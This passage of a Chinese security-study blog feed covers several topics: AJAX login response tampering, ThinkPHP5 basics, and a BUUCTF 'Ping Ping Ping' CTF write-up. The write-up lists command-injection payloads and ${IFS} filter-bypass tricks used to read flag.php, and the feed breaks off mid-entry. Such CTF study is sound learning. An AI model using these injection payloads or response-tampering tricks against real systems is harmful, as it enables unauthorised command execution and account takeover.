        <content type="html"><![CDATA[<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><h2 id="JS文件上传"><a href="#JS文件上传" class="headerlink" title="JS文件上传"></a>JS文件上传</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件上传</span><br><span class="line">对文件上传的后缀名进行识别，可以通过PHP或者JS实现</span><br><span class="line"></span><br><span class="line">前端JS和后端PHP的区别</span><br><span class="line">JS：源代码在前端，可以使用重写前端页面来绕过</span><br><span class="line">    判定方法：看代码，看响应速度……</span><br><span class="line">PHP：源代码在后端，只能进行黑盒测试 </span><br></pre></td></tr></table></figure><h2 id="JS的AJAX"><a href="#JS的AJAX" class="headerlink" title="JS的AJAX"></a>JS的AJAX</h2><p>AJAX：一种传递数据的方式，不过还是白盒的。可以实现数据交互。</p><blockquote><p>环境：前端的支付环境，登录环境–&gt;通过修改BP包影响到整个支付流程或者修改登录标志影响登录，造成任意支付/登录漏洞<br>实际：将正确结果状态码替换掉错误的状态码，导致账号被盗用（验证码）</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>前端</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ajax登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">帐号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pass&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jquery-1.12.4.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;button&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>:<span class="string">&#x27;ajax.php&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">myUname</span>:$(<span class="string">&#x27;.user&#x27;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">myUpass</span>:$(<span class="string">&#x27;.pass&#x27;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//console.log(res);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(res.<span class="property">infoCode</span>==<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;登录成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 在这写后台很危险</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 假设是固定价格到前端，会出现支付逻辑漏洞</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 支付的设置，不能把价格放前端，且购买数量只能为正整数</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 进入后台的代码</span></span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;登录失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myUname&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myUpass&#x27;</span>];</span><br><span class="line"><span class="variable">$success</span>=<span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="variable">$password</span>==<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);</span><br></pre></td></tr></table></figure><blockquote><p>安全测试当中，拦截infocode并且更改值会返回不一样的值。要观察显示结果的决定方。例如success是返回的部分。<br>决定的是JS就好搞，如果还是PHP就难顶了。</p></blockquote><p>看不见AJAX的情况：引入型的JS</p><h1 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h1><h2 id="ThinkePHP5"><a href="#ThinkePHP5" class="headerlink" title="ThinkePHP5"></a>ThinkePHP5</h2><p>找TP框架漏洞的方法：</p><blockquote><p>1.看写法<br>2.看历史版本漏洞(看历史漏洞实验时，漏洞没被修复才能调用)</p><p>获取版本的途径：<br>黑盒：看回显数据包和报错信息，还有看URL地址。插件识别等<br>白盒：看源码配置文件</p></blockquote><p>面对框架的就是框架漏洞。ThibkPHP用户量大。 </p><h3 id="代码学习"><a href="#代码学习" class="headerlink" title="代码学习"></a>代码学习</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">网站访问的文件夹:publick</span><br><span class="line"></span><br><span class="line">本地访问网站访问的路径模块部分:</span><br><span class="line">application\index\Index.php</span><br><span class="line">                    首字母必须大写</span><br><span class="line"></span><br><span class="line">网站访问该index.php文件的一个公共类xiaodi的方法:</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/index.php/index/index/xiaodi</span><br><span class="line">                    控制器 模块名 方法名</span><br><span class="line"></span><br><span class="line">新建application\index\Test.php里面放：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"><span class="comment">//          继承    某模块</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I like my Wife.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="comment">// 接收get参数</span></span><br><span class="line">        <span class="variable">$x</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的get传参值为：<span class="subst">$x</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">访问application\index\Test.php里面index的方法</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/index.php/index/test/index</span><br><span class="line"></span><br><span class="line">访问application\index\Test.php里面n的方法且获取get参数输出</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/index.php/index/test/n?x=<span class="number">1</span></span><br><span class="line">页面输出为：</span><br><span class="line">你的get传参值为：<span class="number">1</span></span><br><span class="line">对应的旧方法使用为：（当前版本好像无法使用，这是ThinkPHYP3点多版本的访问方式）</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?m=index&amp;c=test&amp;a=n</span><br><span class="line"></span><br><span class="line">新建/application/xiaodi/controller/Xiaodi.php,配置为：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">xiaodi</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"><span class="comment">//                  继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I like my Wife.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$x</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的get传参值为：<span class="subst">$x</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">尝试访问的方法：</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/index.php/xiaodi/xiaodi/index</span><br></pre></td></tr></table></figure><h3 id="传参学习"><a href="#传参学习" class="headerlink" title="传参学习"></a>传参学习</h3><p>框架类解题思路：<br>1.是否按照官方的写法去写。<br>2.官方是否有出现过漏洞。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 会被sql注入的写法，可以接受变动</span></span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不会被sql注入的写法</span></span><br><span class="line"><span class="comment">// 按照官方写法来开发网页的话：挖程序漏洞==挖框架漏洞</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;?get.x&#x27;</span>);   <span class="comment"># 官方自带过滤器过滤掉了SQL注入</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;get.x&#x27;</span>);     <span class="comment"># 官方自带过滤器过滤掉了SQL注入</span></span><br></pre></td></tr></table></figure><h3 id="数据库配置文件位置"><a href="#数据库配置文件位置" class="headerlink" title="数据库配置文件位置"></a>数据库配置文件位置</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">修改数据库的配置</span><br><span class="line">application/database.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 数据库类型</span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>            =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="comment">// 服务器地址</span></span><br><span class="line">    <span class="string">&#x27;hostname&#x27;</span>        =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="comment">// 数据库名</span></span><br><span class="line">    <span class="string">&#x27;database&#x27;</span>        =&gt; <span class="string">&#x27;dbname&#x27;</span>,</span><br><span class="line">    <span class="comment">// 用户名</span></span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>        =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="comment">// 密码</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>        =&gt; <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">    <span class="comment">// 端口</span></span><br><span class="line">    <span class="string">&#x27;hostport&#x27;</span>        =&gt; <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">    <span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span>         =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="comment">// 数据库表前缀</span></span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span>          =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="comment">// 开启断线重连</span></span><br><span class="line">    <span class="string">&#x27;break_reconnect&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">对应的数据库操作方法：</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edu</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="title function_ invoke__">input</span>(<span class="string">&quot;get.id&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$id</span>)?<span class="variable">$id</span>:<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;message_copy&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>, <span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$v</span>[<span class="string">&#x27;content&#x27;</span>].<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-PHP开发-03 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-014</title>
      <link href="/2023/05/07/CTF-web-014/"/>
      <url>/2023/05/07/CTF-web-014/</url>
      
        <content type="html"><![CDATA[<h1 id="【BUUCTF】-GXYCTF2019-Ping-Ping-Ping-Writeup"><a href="#【BUUCTF】-GXYCTF2019-Ping-Ping-Ping-Writeup" class="headerlink" title="【BUUCTF】[GXYCTF2019]Ping Ping Ping Writeup"></a>【BUUCTF】[GXYCTF2019]Ping Ping Ping Writeup</h1><p>资料来源于这个<a href="https://blog.csdn.net/vanarrow/article/details/108295481">博客</a></p><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><h3 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h3><p>URL编码：一种百分号和数字字母的组合形式，类似于：%0a.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line"></span><br><span class="line">url编码</span><br><span class="line">%<span class="number">0</span>a  （换行）</span><br><span class="line">%<span class="number">0</span>d  （回车）</span><br></pre></td></tr></table></figure><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">起因：在URL当中的普通输入的空格被过滤导致命令无法执行，需寻找替代品</span><br><span class="line"></span><br><span class="line">IFS: Linux内置环境变量</span><br><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">1</span> <span class="comment">//$1改成$加其他数字貌似都行</span></span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  <span class="comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span></span><br><span class="line">%<span class="number">20</span>   (space)</span><br><span class="line">%<span class="number">09</span>   (tab)</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure><h3 id="联合查询例子如下："><a href="#联合查询例子如下：" class="headerlink" title="联合查询例子如下："></a>联合查询例子如下：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span>在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或<span class="variable">$IFS</span>垂直，后面加个$与&#123;&#125;类似，起截断作用.简单说，$IFS$<span class="number">1</span>是一个整体</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="直接查询"><a href="#直接查询" class="headerlink" title="直接查询"></a>直接查询</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查询</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;ifconfig</span><br><span class="line">返回</span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">82</span>:<span class="number">0</span>A:<span class="number">99</span>:FB:<span class="number">28</span>:<span class="number">6</span>E  </span><br><span class="line">          inet addr:<span class="number">10.244</span>.<span class="number">80.11</span>  Bcast:<span class="number">0.0</span>.<span class="number">0.0</span>  Mask:<span class="number">255.255</span>.<span class="number">255.255</span></span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1450</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">39</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">26</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">          RX bytes:<span class="number">5154</span> (<span class="number">5.0</span> KiB)  TX bytes:<span class="number">2210</span> (<span class="number">2.1</span> KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span>.<span class="number">0.1</span>  Mask:<span class="number">255.0</span>.<span class="number">0.0</span></span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">43</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">43</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX bytes:<span class="number">7960</span> (<span class="number">7.7</span> KiB)  TX bytes:<span class="number">7960</span> (<span class="number">7.7</span> KiB)</span><br><span class="line">证明是Linux系统</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;ls</span><br><span class="line">返回</span><br><span class="line">index.php</span><br><span class="line">flag.php</span><br><span class="line"></span><br><span class="line">试图直接展示</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat flag.php</span><br><span class="line">返回</span><br><span class="line">/?ip=fxck your space!</span><br><span class="line">测试了下所有的类似于cat,tac的显示，均无法显示</span><br></pre></td></tr></table></figure><h3 id="换空格"><a href="#换空格" class="headerlink" title="换空格"></a>换空格</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 换空格</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS<span class="variable">$flag</span>.php</span><br><span class="line">返回</span><br><span class="line">/?ip=fxck your space!</span><br><span class="line"></span><br><span class="line">- 获取过滤源码</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>|cat$IFS$<span class="number">1</span>index.php</span><br><span class="line">返回</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 分析源码</span></span><br><span class="line"><span class="string">1.正则表达式过滤：</span></span><br><span class="line"><span class="string">    特殊字符 &amp;/?*&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]&gt;&#x27;</span><span class="string">&quot;\()[]&#123;&#125; 空格 /bash/ </span></span><br><span class="line"><span class="string">    文件名贪婪匹配过滤：*f*l*a*g* =意味着=&gt; 无法使用f\l\a\g.php,flag.php等</span></span><br><span class="line"><span class="string">2.变量<span class="subst">$a</span></span></span><br></pre></td></tr></table></figure><h2 id="尝试绕过"><a href="#尝试绕过" class="headerlink" title="尝试绕过"></a>尝试绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">尝试覆盖</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=f;cat$IFS$<span class="number">1</span><span class="variable">$alag</span>.php        错误</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=l;cat$IFS$<span class="number">1</span>f<span class="variable">$aag</span>.php        无</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=a;cat$IFS$<span class="number">1</span>fl<span class="variable">$ag</span>.php        错误</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;cat$IFS$<span class="number">1</span>fla<span class="variable">$a</span>.php        有flag</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=fl;b=ag;cat$IFS$<span class="number">1</span>$a<span class="variable">$b</span>.php   错误</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;b=ag;a=fl;cat$IFS$<span class="number">1</span>$a<span class="variable">$b</span>.php   有flag</span><br><span class="line"></span><br><span class="line">注释当中找到flag</span><br><span class="line">flag&#123;<span class="number">7</span>bbe778b-<span class="number">9</span>dda-<span class="number">4980</span>-<span class="number">8532</span>-<span class="number">9</span>deb7904bd14&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0008-php开发-01-文件读取/下载/删除/写入/SESSION/COOKIE/验证码</title>
      <link href="/2023/05/03/SEC-Study-0036/"/>
      <url>/2023/05/03/SEC-Study-0036/</url>
      
        <content type="html"><![CDATA[<p>根据源代码对应的功能猜测具体漏洞。<br>解决不了的问题–学会放弃，毕竟WAF不是能随便绕的。</p><span id="more"></span><h1 id="PHP开发-分页读取文件条目"><a href="#PHP开发-分页读取文件条目" class="headerlink" title="PHP开发-分页读取文件条目"></a>PHP开发-分页读取文件条目</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、PHP入门-语法&amp;提交等<br>2、MYSQL入门-数据库操作<br>3、HTML+CSS入门-样式编排</p><p>安全向：SQL注入。=&gt;通过功能去找注入点。</p><h2 id="实现功能："><a href="#实现功能：" class="headerlink" title="实现功能："></a>实现功能：</h2><p>前端文章导航，点入内容显示，更改ID显示不同内容</p><p>前台显示文章，后台添加文章。</p><p>文章阅读，留言板，会员中心，模板风格引入……<br>登录验证，文章增删改查，配置修改……<br>php代码和html代码混编执行。</p><h2 id="实现步骤："><a href="#实现步骤：" class="headerlink" title="实现步骤："></a>实现步骤：</h2><p>php配置文件有：index.php,news.php,conn.php</p><blockquote><p>index：主页文件<br>news：新闻模块<br>conn：数据库连接文件</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        li &#123;</span><br><span class="line">            